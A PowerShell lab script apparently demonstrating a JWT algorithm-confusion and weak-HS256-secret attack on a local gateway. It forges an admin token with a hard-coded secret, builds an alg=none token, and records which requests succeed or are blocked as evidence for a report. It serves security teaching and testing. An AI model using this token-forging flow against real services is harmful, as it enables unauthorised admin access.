param(
  [string]$BaseUrl = "http://localhost:3001",
  [string]$KeycloakUrl = "http://localhost:8080",
  [string]$OutputDir = "outputs/risk1-demo"
)

$ErrorActionPreference = "Stop"

function Ensure-Dir($Path) {
  if (-not (Test-Path $Path)) {
    New-Item -ItemType Directory -Path $Path | Out-Null
  }
}

function Invoke-ApiCapture {
  param(
    [string]$Name,
    [string]$Method,
    [string]$Uri,
    [hashtable]$Headers = @{},
    $Body = $null,
    [string]$ContentType = $null
  )

  $result = [ordered]@{
    name = $Name
    method = $Method
    uri = $Uri
    status = $null
    ok = $false
    body = $null
  }

  try {
    $params = @{
      Method = $Method
      Uri = $Uri
      Headers = $Headers
      UseBasicParsing = $true
    }
    if ($null -ne $Body) {
      $params.Body = $Body
    }
    if ($ContentType) {
      $params.ContentType = $ContentType
    }
    $response = Invoke-WebRequest @params
    $result.status = [int]$response.StatusCode
    $result.ok = $true
    $result.body = $response.Content
  } catch {
    $webResponse = $_.Exception.Response
    if ($webResponse) {
      $result.status = [int]$webResponse.StatusCode
      $stream = $webResponse.GetResponseStream()
      $reader = New-Object System.IO.StreamReader($stream)
      $result.body = $reader.ReadToEnd()
    } else {
      $result.status = -1
      $result.body = $_.Exception.Message
    }
  }

  return [pscustomobject]$result
}

function Decode-JwtPart {
  param([string]$Part)
  $padded = $Part.Replace("-", "+").Replace("_", "/")
  $padded = $padded.PadRight($padded.Length + (4 - $padded.Length % 4) % 4, "=")
  return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($padded))
}

function Save-TextPng {
  param(
    [string]$Path,
    [string]$Title,
    [string[]]$Lines
  )

  Add-Type -AssemblyName System.Drawing
  $width = 1400
  $lineHeight = 28
  $height = [Math]::Max(520, 150 + ($Lines.Count * $lineHeight))
  $bmp = New-Object System.Drawing.Bitmap($width, $height)
  $g = [System.Drawing.Graphics]::FromImage($bmp)
  $g.Clear([System.Drawing.Color]::FromArgb(248, 250, 252))

  $titleFont = New-Object System.Drawing.Font("Consolas", 26, [System.Drawing.FontStyle]::Bold)
  $bodyFont = New-Object System.Drawing.Font("Consolas", 15, [System.Drawing.FontStyle]::Regular)
  $smallFont = New-Object System.Drawing.Font("Consolas", 12, [System.Drawing.FontStyle]::Regular)
  $dark = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(15, 23, 42))
  $muted = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(71, 85, 105))
  $border = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(203, 213, 225), 2)

  $g.DrawString($Title, $titleFont, $dark, 40, 32)
  $g.DrawString("Risk 1 - JWT Algorithm Confusion / HS256 Weak Secret", $smallFont, $muted, 42, 76)
  $g.DrawRectangle($border, 38, 112, $width - 76, $height - 150)

  $y = 136
  foreach ($line in $Lines) {
    $g.DrawString($line, $bodyFont, $dark, 58, $y)
    $y += $lineHeight
  }

  $bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)
  $g.Dispose()
  $bmp.Dispose()
}

Ensure-Dir $OutputDir

$evidence = [ordered]@{
  generatedAt = (Get-Date).ToString("s")
  baseUrl = $BaseUrl
  keycloakUrl = $KeycloakUrl
  steps = @()
}

$composePs = docker compose ps
$composePs | Out-File -Encoding UTF8 "$OutputDir/01-docker-compose-ps.txt"

$health = Invoke-ApiCapture -Name "Gateway health" -Method "GET" -Uri "$BaseUrl/health"
$keyStatusBefore = Invoke-ApiCapture -Name "Gateway key status" -Method "GET" -Uri "$BaseUrl/api/crypto/key-status"
$evidence.steps += $health
$evidence.steps += $keyStatusBefore

$keyStatusObject = $keyStatusBefore.body | ConvertFrom-Json
$kid = $keyStatusObject.hs256.currentKid

$keycloakBody = @{
  grant_type = "password"
  client_id = "demo-client"
  username = "alice"
  password = "Alice@123"
}
$keycloakToken = Invoke-RestMethod -Method Post -Uri "$KeycloakUrl/realms/DOAN/protocol/openid-connect/token" -ContentType "application/x-www-form-urlencoded" -Body $keycloakBody
$keycloakPayload = Decode-JwtPart -Part $keycloakToken.access_token.Split(".")[1] | ConvertFrom-Json
$keycloakSummary = [ordered]@{
  issuer = $keycloakPayload.iss
  username = $keycloakPayload.preferred_username
  roles = $keycloakPayload.realm_access.roles
  tokenType = $keycloakToken.token_type
  expiresIn = $keycloakToken.expires_in
}
$keycloakSummary | ConvertTo-Json -Depth 10 | Out-File -Encoding UTF8 "$OutputDir/02-keycloak-token-summary.json"

$userTokenResponse = Invoke-RestMethod -Method Post -Uri "$BaseUrl/api/demo/token/hs256"
$userToken = $userTokenResponse.token
$userPayload = Decode-JwtPart -Part $userToken.Split(".")[1] | ConvertFrom-Json
$userSummary = [ordered]@{
  algorithm = $userTokenResponse.algorithm
  kid = $userTokenResponse.kid
  username = $userPayload.preferred_username
  roles = $userPayload.realm_access.roles
  issuer = $userPayload.iss
  audience = $userPayload.aud
}
$userSummary | ConvertTo-Json -Depth 10 | Out-File -Encoding UTF8 "$OutputDir/03-user-token-summary.json"

$userAdmin = Invoke-ApiCapture -Name "User token calls /api/admin" -Method "GET" -Uri "$BaseUrl/api/admin" -Headers @{ Authorization = "Bearer $userToken" }
$evidence.steps += $userAdmin

$env:FORGE_KID = $kid
$env:FORGE_SECRET = "khoa-bi-mat-24byte-cho-hs256!!"
$env:FORGE_ISSUER = "$BaseUrl/demo-idp"
$forgedToken = (node .\scripts\forge-risk1-token.js).Trim()
$forgedPayload = Decode-JwtPart -Part $forgedToken.Split(".")[1] | ConvertFrom-Json
$forgedSummary = [ordered]@{
  algorithm = "HS256"
  kid = $kid
  username = $forgedPayload.preferred_username
  roles = $forgedPayload.realm_access.roles
  issuer = $forgedPayload.iss
  audience = $forgedPayload.aud
}
$forgedSummary | ConvertTo-Json -Depth 10 | Out-File -Encoding UTF8 "$OutputDir/04-forged-token-summary.json"

$forgedVerify = Invoke-ApiCapture -Name "Forged admin token calls /api/crypto/jwt-algorithm" -Method "GET" -Uri "$BaseUrl/api/crypto/jwt-algorithm" -Headers @{ Authorization = "Bearer $forgedToken" }
$forgedAdmin = Invoke-ApiCapture -Name "Forged admin token calls /api/admin" -Method "GET" -Uri "$BaseUrl/api/admin" -Headers @{ Authorization = "Bearer $forgedToken" }
$evidence.steps += $forgedVerify
$evidence.steps += $forgedAdmin

$badKidToken = (node .\scripts\generate-hs256-token.js --bad-kid).Trim()
$badKidResult = Invoke-ApiCapture -Name "Bad kid token is blocked" -Method "GET" -Uri "$BaseUrl/api/crypto/jwt-algorithm" -Headers @{ Authorization = "Bearer $badKidToken" }
$evidence.steps += $badKidResult

$parts = $userToken.Split(".")
$algNoneHeader = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('{"alg":"none","typ":"JWT"}')).TrimEnd("=").Replace("+", "-").Replace("/", "_")
$algNoneToken = "$algNoneHeader.$($parts[1])."
$algNoneResult = Invoke-ApiCapture -Name "alg=none token is blocked" -Method "GET" -Uri "$BaseUrl/api/crypto/jwt-algorithm" -Headers @{ Authorization = "Bearer $algNoneToken" }
$evidence.steps += $algNoneResult

$logs = docker compose logs backend --tail=120
$logs | Out-File -Encoding UTF8 "$OutputDir/05-backend-logs-tail.txt"

$evidence | ConvertTo-Json -Depth 20 | Out-File -Encoding UTF8 "$OutputDir/evidence.json"

$summaryLines = @(
  "BaseUrl: $BaseUrl",
  "Keycloak: $KeycloakUrl",
  "Docker services:",
  ($composePs -join "`n"),
  "",
  "Health: HTTP $($health.status) $($health.body)",
  "Key status HS256 kid: $kid",
  "",
  "Keycloak user alice token:",
  "issuer=$($keycloakSummary.issuer)",
  "roles=$($keycloakSummary.roles -join ',')",
  "",
  "Normal user token:",
  "alg=$($userSummary.algorithm), kid=$($userSummary.kid), roles=$($userSummary.roles -join ',')",
  "/api/admin with user token => HTTP $($userAdmin.status)",
  "",
  "Forged HS256 token:",
  "alg=HS256, kid=$kid, roles=$($forgedSummary.roles -join ',')",
  "/api/crypto/jwt-algorithm with forged token => HTTP $($forgedVerify.status)",
  "/api/admin with forged admin token => HTTP $($forgedAdmin.status)",
  "",
  "Negative controls:",
  "bad kid token => HTTP $($badKidResult.status)",
  "alg=none token => HTTP $($algNoneResult.status)"
)

$summaryLines | Out-File -Encoding UTF8 "$OutputDir/00-summary.txt"

Save-TextPng -Path "$OutputDir/01-docker-health.png" -Title "01. Docker + Gateway Health" -Lines @(
  "docker compose ps",
  ($composePs -join "`n"),
  "",
  "GET $BaseUrl/health => HTTP $($health.status)",
  $health.body
)

Save-TextPng -Path "$OutputDir/02-user-token-403.png" -Title "02. User Token Cannot Access Admin" -Lines @(
  "Token source: POST $BaseUrl/api/demo/token/hs256",
  "alg=$($userSummary.algorithm)",
  "kid=$($userSummary.kid)",
  "roles=$($userSummary.roles -join ',')",
  "issuer=$($userSummary.issuer)",
  "",
  "GET $BaseUrl/api/admin",
  "Expected: user role is rejected",
  "Actual HTTP status: $($userAdmin.status)",
  "Response: $($userAdmin.body)"
)

Save-TextPng -Path "$OutputDir/03-forged-token-200.png" -Title "03. Forged HS256 Admin Token Accepted" -Lines @(
  "Forged token created inside LAB only",
  "alg=HS256",
  "kid=$kid",
  "secret=khoa-bi-mat-24byte-cho-hs256!!",
  "roles=$($forgedSummary.roles -join ',')",
  "issuer=$($forgedSummary.issuer)",
  "",
  "GET $BaseUrl/api/crypto/jwt-algorithm => HTTP $($forgedVerify.status)",
  "Response: $($forgedVerify.body)",
  "",
  "GET $BaseUrl/api/admin => HTTP $($forgedAdmin.status)",
  "Response: $($forgedAdmin.body)"
)

Save-TextPng -Path "$OutputDir/04-negative-controls.png" -Title "04. Negative Controls Blocked" -Lines @(
  "Bad kid token:",
  "GET $BaseUrl/api/crypto/jwt-algorithm => HTTP $($badKidResult.status)",
  "Response: $($badKidResult.body)",
  "",
  "alg=none token:",
  "GET $BaseUrl/api/crypto/jwt-algorithm => HTTP $($algNoneResult.status)",
  "Response: $($algNoneResult.body)"
)

$html = @"
<!doctype html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <title>Risk 1 Demo Evidence</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 32px; background: #f8fafc; color: #0f172a; }
    h1 { margin-bottom: 0; }
    .sub { color: #475569; margin-top: 6px; }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin-top: 24px; }
    .card { background: white; border: 1px solid #cbd5e1; border-radius: 8px; padding: 18px; }
    pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #0f172a; color: #e2e8f0; padding: 14px; border-radius: 6px; }
    .ok { color: #047857; font-weight: 700; }
    .bad { color: #b91c1c; font-weight: 700; }
  </style>
</head>
<body>
  <h1>Risk 1 Demo Evidence</h1>
  <p class="sub">JWT Algorithm Confusion / HS256 Weak Secret - generated at $($evidence.generatedAt)</p>
  <div class="grid">
    <div class="card"><h2>1. Services</h2><pre>$($composePs -join "`n")</pre></div>
    <div class="card"><h2>2. Gateway Health</h2><p class="ok">HTTP $($health.status)</p><pre>$($health.body)</pre></div>
    <div class="card"><h2>3. User Token</h2><p>roles=$($userSummary.roles -join ',')</p><p class="bad">/api/admin => HTTP $($userAdmin.status)</p><pre>$($userAdmin.body)</pre></div>
    <div class="card"><h2>4. Forged Token</h2><p>roles=$($forgedSummary.roles -join ',')</p><p class="ok">/api/admin => HTTP $($forgedAdmin.status)</p><pre>$($forgedAdmin.body)</pre></div>
    <div class="card"><h2>5. Bad kid blocked</h2><p class="bad">HTTP $($badKidResult.status)</p><pre>$($badKidResult.body)</pre></div>
    <div class="card"><h2>6. alg=none blocked</h2><p class="bad">HTTP $($algNoneResult.status)</p><pre>$($algNoneResult.body)</pre></div>
  </div>
</body>
</html>
"@
$html | Out-File -Encoding UTF8 "$OutputDir/index.html"

Write-Host "Risk 1 demo evidence generated in $OutputDir"
Write-Host "Summary:"
Get-Content "$OutputDir/00-summary.txt"
